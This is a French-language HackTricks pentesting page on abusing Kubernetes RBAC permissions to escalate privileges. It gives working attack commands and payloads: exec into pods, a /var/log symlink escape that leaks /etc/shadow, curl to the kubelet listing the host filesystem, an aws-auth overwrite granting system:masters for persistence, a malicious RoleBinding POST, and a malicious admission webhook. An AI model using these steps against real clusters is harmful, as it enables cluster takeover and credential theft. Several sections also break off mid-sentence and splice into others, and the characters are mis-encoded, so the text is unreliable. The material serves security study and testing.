# Abus de r√¥les/ClusterRoles dans Kubernetes

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFT exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) **et** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>

Ici, vous pouvez trouver des configurations de r√¥les et de ClusterRoles potentiellement dangereuses.\
Rappelez-vous que vous pouvez obtenir toutes les ressources prises en charge avec `kubectl api-resources`

## **√âl√©vation de privil√®ges**

En r√©f√©rence √† l'art d'obtenir **l'acc√®s √† un principal diff√©rent** dans le cluster **avec des privil√®ges diff√©rents** (dans le cluster Kubernetes ou vers des clouds externes) que ceux que vous avez d√©j√†, dans Kubernetes, il existe essentiellement **4 techniques principales pour escalader les privil√®ges** :

* √ätre capable de **s'impersonnaliser** en tant qu'autres utilisateurs/groupes/SA avec des privil√®ges sup√©rieurs dans le cluster Kubernetes ou vers des clouds externes
* √ätre capable de **cr√©er/patcher/ex√©cuter des pods** o√π vous pouvez **trouver ou attacher des SA** avec des privil√®ges sup√©rieurs dans le cluster Kubernetes ou vers des clouds externes
* √ätre capable de **lire des secrets** car les jetons SA sont stock√©s sous forme de secrets
* √ätre capable de **s'√©chapper vers le n≈ìud** √† partir d'un conteneur, o√π vous pouvez voler tous les secrets des conteneurs en cours d'ex√©cution dans le n≈ìud, les informations d'identification du n≈ìud et les autorisations du n≈ìud dans le cloud o√π il s'ex√©cute (le cas √©ch√©ant)
* Une cinqui√®me technique qui m√©rite d'√™tre mentionn√©e est la capacit√© √† **ex√©cuter un port-forward** dans un pod, car vous pouvez acc√©der √† des ressources int√©ressantes dans ce pod.

### **Acc√®s √† n'importe quelle ressource ou verbe (joker)**

Ce privil√®ge fournit un acc√®s √† **n'importe quelle ressource avec n'importe quel verbe**. C'est le privil√®ge le plus important qu'un utilisateur puisse obtenir, surtout si ce privil√®ge est √©galement un "ClusterRole". S'il s'agit d'un "ClusterRole", l'utilisateur peut acc√©der aux ressources de n'importe quel espace de noms et poss√©der le cluster avec cette autorisation.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

### **Acc√®s √† n'importe quelle ressource**

Donner √† un utilisateur la permission d'**acc√©der √† n'importe quelle ressource peut √™tre tr√®s risqu√©**. Mais, **quels verbes** permettent d'acc√©der √† ces ressources ? Voici quelques autorisations RBAC dangereuses qui peuvent endommager l'ensemble du cluster :

* **resources: \["\*"] verbs: \["create"]** ‚Äì Ce privil√®ge peut **cr√©er n'importe quelle ressource** dans le cluster, telle que des **pods**, des r√¥les, etc. Un attaquant pourrait l'utiliser pour **escalader les privil√®ges**. Un exemple de cela peut √™tre trouv√© dans la section **"Cr√©ation de pods"**.
* **resources: \["\*"] verbs: \["list"]** ‚Äì La capacit√© √† lister n'importe quelle ressource peut √™tre utilis√©e pour **fuir les secrets d'autres utilisateurs** et peut faciliter l'**escal
### **Pods Exec**

**`pods/exec`** est une ressource dans Kubernetes utilis√©e pour **ex√©cuter des commandes dans un shell √† l'int√©rieur d'un pod**. Ce privil√®ge est destin√© aux administrateurs qui souhaitent **acc√©der aux conteneurs et ex√©cuter des commandes**. C'est comme cr√©er une session SSH pour le conteneur.

Si nous avons ce privil√®ge, nous avons en fait la capacit√© **de prendre le contr√¥le de tous les pods**. Pour ce faire, nous devons utiliser la commande suivante :

```bash
kubectl exec -it <NOM_DU_POD> -n <NAMESPACE> -- sh
```

Notez que comme vous pouvez entrer dans n'importe quel pod, vous pouvez abuser du jeton d'autres pods comme dans l'exploitation de la cr√©ation de pod pour essayer d'escalader les privil√®ges.

### port-forward

Cette autorisation permet de **rediriger un port local vers un port dans le pod sp√©cifi√©**. Cela permet de d√©boguer facilement les applications en cours d'ex√©cution √† l'int√©rieur d'un pod, mais un attaquant pourrait l'abuser pour acc√©der √† des applications int√©ressantes (comme des bases de donn√©es) ou vuln√©rables (sites web ?) √† l'int√©rieur d'un pod :

```
kubectl port-forward pod/mypod 5000:5000
```

### **Hosts Writable /var/log/ Escape**

Comme [**indiqu√© dans cette recherche**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), si vous pouvez acc√©der ou cr√©er un pod avec le **r√©pertoire `/var/log/` des h√¥tes mont√©** dessus, vous pouvez **√©chapper du conteneur**.\
C'est essentiellement parce que lorsque le **Kube-API essaie d'obtenir les journaux** d'un conteneur (en utilisant `kubectl logs <pod>`), il **demande le fichier `0.log`** du pod en utilisant l'endpoint `/logs/` du service **Kubelet**.\
Le service Kubelet expose l'endpoint `/logs/` qui expose essentiellement le syst√®me de fichiers `/var/log` du conteneur.

Par cons√©quent, un attaquant ayant **acc√®s en √©criture au dossier /var/log/** du conteneur pourrait abuser de ces comportements de 2 mani√®res :

* Modifier le fichier `0.log` de son conteneur (g√©n√©ralement situ√© dans `/var/logs/pods/namespace_pod_uid/container/0.log`) pour qu'il soit un **lien symbolique pointant vers `/etc/shadow`** par exemple. Ensuite, vous pourrez exfiltrer le fichier shadow des h√¥tes en faisant :

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Continuez √† incr√©menter la queue pour exfiltrer le fichier entier
```

* Si l'attaquant contr√¥le un principal avec les **permissions de lecture de `nodes/log`**, il peut simplement cr√©er un **lien symbolique** dans `/host-mounted/var/log/sym` vers `/` et lorsqu'il **acc√®de √† `https://<gateway>:10250/logs/sym/` il listera le syst√®me de fichiers racine** des h√¥tes (en changeant le lien symbolique, il peut fournir l'acc√®s aux fichiers).

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**Un laboratoire et une exploitation automatis√©e peuvent √™tre trouv√©s dans** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Bypassing readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Si vous avez la chance et que la capacit√© hautement privil√©gi√©e `CAP_SYS_ADMIN` est disponible, vous pouvez simplement remonter le dossier en rw :

```bash
mount -o rw,remount /hostlogs/
```

#### Bypassing hostPath readOnly protection <a
### AWS EKS aws-auth configmaps

Les principaux qui peuvent modifier les **`configmaps`** dans l'espace de noms kube-system sur les clusters EKS (doivent √™tre dans AWS) peuvent obtenir des privil√®ges d'administrateur de cluster en √©crasant la **configmap aws-auth**.\
Les verbes n√©cessaires sont **`update`** et **`patch`**, ou **`create`** si la configmap n'a pas √©t√© cr√©√©e :

{% code overflow="wrap" %}
```bash
# V√©rifier si la configmap existe
get configmap aws-auth -n kube-system -o yaml

## Exemple de yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: aws-auth
  namespace: kube-system
data:
  mapRoles: |
    - rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
      username: system:node:{{EC2PrivateDNSName}}
      groups:
        - system:masters

# Cr√©er la configmap si elle n'existe pas
## En utilisant kubectl et le yaml pr√©c√©dent
kubectl apply -f /tmp/aws-auth.yaml
## En utilisant eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# La modifier
kubectl edit -n kube-system configmap/aws-auth
## Vous pouvez la modifier pour donner acc√®s m√™me aux utilisateurs d'autres comptes
data:
  mapRoles: |
    - rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
      username: system:node:{{EC2PrivateDNSName}}
      groups:
        - system:masters
  mapUsers: |
    - userarn: arn:aws:iam::098765432123:user/SomeUserTestName
      username: admin
      groups:
        - system:masters
```
{% endcode %}

{% hint style="warning" %}
Vous pouvez utiliser **`aws-auth`** pour la **persistance** en donnant acc√®s aux utilisateurs d'**autres comptes**.

Cependant, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **ne fonctionne pas depuis un compte diff√©rent**. Mais en r√©alit√©, `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` fonctionne si vous mettez l'ARN du cluster au lieu du nom.\
Pour que `kubectl` fonctionne, assurez-vous simplement de **configurer** le **kubeconfig de la victime** et dans les arguments aws exec ajoutez `--profile other_account_role` afin que kubectl utilise le profil de compte des autres pour obtenir le jeton et contacter AWS.
{% endhint %}

### Escalade dans GKE

Il existe **2 fa√ßons d'attribuer des autorisations K8s aux principaux GCP**. Dans tous les cas, le principal a √©galement besoin de la permission **`container.clusters.get`** pour pouvoir collecter des informations d'identification pour acc√©der au cluster, ou vous devrez **g√©n√©rer votre propre fichier de configuration kubectl** (suivez le lien suivant).

{% hint style="warning" %}
Lorsqu'il communique avec le point de terminaison de l'API K8s, le **jeton d'authentification GCP sera envoy√©**. Ensuite, GCP, via le point de terminaison de l'API K8s, v√©rifiera d'abord si le principal (par e-mail) a un acc√®s quelconque √† l'int√©rieur du cluster, puis il v√©rifiera s'il a un acc√®s via GCP IAM.\
Si **l'un** de ceux-ci est **vrai**, il sera **r√©pondu**. Si **non**, une **erreur** sugg√©rant de donner des **autorisations via GCP IAM** sera donn√©e.
{% endhint %}

Ensuite, la premi√®re m√©thode consiste √† utiliser **GCP IAM**, les autorisations K8s ont leurs **autorisations GCP IAM √©quivalentes**, et si le principal les a, il pourra les utiliser.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

La deuxi√®me m√©thode consiste √† **attribuer des autorisations K8s √† l'int√©rieur du cluster** en identifiant l'utilisateur par son **e-mail** (les comptes de service GCP sont inclus).

### Cr√©er des jetons de serviceaccounts

Les principaux qui peuvent **cr√©er des TokenRequests** (`serviceaccounts/token`) peuvent √©mettre des jetons pour les SAs √©quivalents √† l'administrateur (informations provenant de [**ici**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Les principaux qui peuvent **`update`** ou **`patch`** **`pods/ephemeralcontainers`** peuvent obtenir une **ex√©cution de code sur d'autres pods**, et potentiellement **s'√©chapper** vers leur n≈ìud en ajoutant un conteneur √©ph√©m√®re avec un contexte de s√©curit√© privil√©gi√©.

### ValidatingWebhookConfigurations ou MutatingWebhookConfigurations

Les principaux avec l'un des verbes `create`, `update` ou `patch` sur `validatingwebhookconfigurations` ou `mutatingwebhookconfigurations` pourraient √™tre en mesure de **cr√©er l'un de ces webhookconfigurations** afin de pouvoir **escalader les privil√®ges**.

Pour un exemple de [`mutatingwebhookconfigurations`, consultez cette section de ce post](./#malicious-admission-controller).

### Escalade

Comme vous pouvez le lire dans la section suivante : [**Pr√©vention de l'escalade de privil√®ges int√©gr√©e**](./#built-in-privileged-escalation-prevention), un principal ne peut pas mettre √† jour ni cr√©er de r√¥les ou de clusterroles sans avoir lui-m√™me ces nouvelles autorisations. Sauf s'il a le **verbe `escalate`** sur **`roles`** ou **`clusterroles`.**\
Ensuite, il peut mettre √† jour/cr√©er de nouveaux r√¥les, clusterroles avec des autorisations sup√©rieures √† celles qu'il poss√®de.

### Proxy de n≈ìuds

Les principaux ayant acc√®s √† la sous-ressource **`nodes/proxy`** peuvent **ex√©cut
### **Obtenir et corriger les RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Apparemment, cette technique fonctionnait auparavant, mais selon mes tests, elle ne fonctionne plus pour la m√™me raison expliqu√©e dans la section pr√©c√©dente. Vous ne pouvez pas cr√©er/modifier un RoleBinding pour vous donner ou donner √† un autre SA certains privil√®ges si vous ne les avez pas d√©j√†.**
{% endhint %}

Le privil√®ge de cr√©er des RoleBindings permet √† un utilisateur de **lier des r√¥les √† un compte de service**. Ce privil√®ge peut potentiellement conduire √† une √©l√©vation de privil√®ges car il **permet √† l'utilisateur de lier des privil√®ges d'administrateur √† un compte de service compromis.**

Le ClusterRole suivant utilise le verbe sp√©cial _bind_ qui permet √† un utilisateur de cr√©er un RoleBinding avec le ClusterRole _admin_ (r√¥le par d√©faut √† haut privil√®ge) et d'ajouter n'importe quel utilisateur, y compris lui-m√™me, √† ce ClusterRole admin.

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

Ensuite, il est possible de cr√©er **`malicious-RoleBinging.json`**, qui **lie le r√¥le admin √† un autre compte de service compromis :**

```javascript
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespaces": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "compromised-svc"
            "namespace": "default"
        }
    ]
}
```

Le but de ce fichier JSON est de lier le r√¥le admin (ligne 11) au compte de service compromis (ligne 16).

Maintenant, tout ce que nous avons √† faire est d'envoyer notre JSON en tant que requ√™te POST √† l'API en utilisant la commande CURL suivante :

```bash
curl -k -v -X POST -H "Authorization: Bearer <JETON JWT>" \ 
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
 -d @malicious-RoleBinging.json
```

Apr√®s que le **r√¥le admin est li√© au compte de service "compromised-svc"**, nous pouvons utiliser le jeton du compte de service compromis pour **lister les secrets**. La commande CURL suivante fera cela :

```bash
curl -k -v -X POST -H "Authorization: Bearer <JETON JWT COMPROMIS>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```

## Autres attaques

### Application proxy Sidecar

Par d√©faut, il n'y a pas de chiffrement dans la communication entre les pods. L'authentification mutuelle, bidirectionnelle, pod √† pod.

#### Cr√©er une application proxy Sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Cr√©ez votre fichier .yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Modifiez votre fichier .yaml et ajoutez les lignes comment√©es :

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
    command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
    securityContext:
      capabilities:
        add: ["NET_ADMIN"]
 #   volumeMounts:
 #   - name: sec-ctx-vol
 #     mountPath: /data/demo
 #   securityContext:
 #     allowPrivilegeEscalation: true
```

Voyez les journaux du proxy :

```bash
kubectl logs app -C proxy
```

Plus d'informations sur : [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Contr√¥leur d'admission malveillant

Un contr√¥leur d'admission est un morceau de code qui **intercepte les demandes aupr√®s du serveur API Kubernetes** avant la persistance de l'objet, mais **apr√®s que la demande est authentifi√©e et autoris√©e**.

Si un attaquant parvient d'une mani√®re ou d'une autre √† **injecter un contr√¥leur d'admission de mutation**, il sera en mesure de **modifier les demandes d√©j√† authentifi√©es**. Il peut potentiellement obtenir des privil√®ges √©lev√©s et plus g√©n√©ralement persister dans le cluster.

Exemple de [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers) :

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Attendez que le serveur webhook soit pr√™t. V√©rifiez l'√©tat :

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Une fois que notre webhook de mutation malveillant est en cours d'ex√©cution, d√©ployons un nouveau pod.

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Attendez √† nouveau, jusqu'√† ce que vous voyiez le changement d'√©tat du pod. Maintenant, vous pouvez voir l'erreur `ErrImagePull`. V√©rifiez le nom de l'image avec l'une des requ√™tes suivantes.

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Comme vous pouvez le voir dans l'image ci-dessus, nous avons essay√© d'ex√©cuter l'image `nginx`, mais l'image ex√©cut√©e est `rewanthtammana/malicious-image`. Que vient-il de se passer !?

#### D√©tails techniques <a href="#heading-technicalities" id="heading-technicalities"></a>

Nous allons d√©plier ce qui vient de se passer